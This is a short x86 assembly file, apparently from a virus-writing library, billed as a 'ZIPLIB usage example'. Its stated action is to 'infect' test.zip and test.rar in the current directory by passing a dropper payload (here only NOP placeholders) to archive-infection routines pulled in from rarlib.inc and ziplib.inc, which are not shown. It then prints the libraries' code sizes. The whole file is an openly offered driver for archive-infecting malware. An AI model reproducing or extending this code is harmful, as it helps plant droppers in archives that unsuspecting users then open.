
; ZIPLIB usage example
;
; action: infect 'test.zip' & 'test.rar' archivez (in the current directory)

callW                   macro   x
                        extern  x:PROC
                        call    x
                        endm

                        p386
                        model   flat
                        locals  __
                        jumps

                        .data

testzipfile             db      'test.zip',0       ; to be infected
testrarfile             db      'test.rar',0

dropper:                nop                        ; dropper's code
                        nop
                        nop
dropper_size            equ     $-dropper

                        .code
start:
                        lea     esi, dropper
                        mov     ecx, dropper_size

                        lea     edx, testzipfile
                        call    process_zip

                        lea     edx, testrarfile
                        call    process_rar

                        push    -1              ; exit to md
                        callW   ExitProcess

include                 fioexlow.inc            ; file io
include                 xcrc32.inc              ; crc32

r_start:
include                 rarlib.inc              ; .rar archives management
r_size                  equ     $-r_start

z_start:
include                 ziplib.inc              ; .zip archives management
z_size                  equ     $-z_start

t_size                  equ     r_size+z_size

db 13,10
db '------------------------',13,10
db 'rarlib code size = '
db r_size / 1000 mod 10 + '0'
db r_size /  100 mod 10 + '0'
db r_size /   10 mod 10 + '0'
db r_size /    1 mod 10 + '0',13,10
db 'ziplib code size = '
db z_size / 1000 mod 10 + '0'
db z_size /  100 mod 10 + '0'
db z_size /   10 mod 10 + '0'
db z_size /    1 mod 10 + '0',13,10
db 'total code size  = '
db t_size / 1000 mod 10 + '0'
db t_size /  100 mod 10 + '0'
db t_size /   10 mod 10 + '0'
db t_size /    1 mod 10 + '0',13,10
db '------------------------',13,10
db 13,10

                        end     start
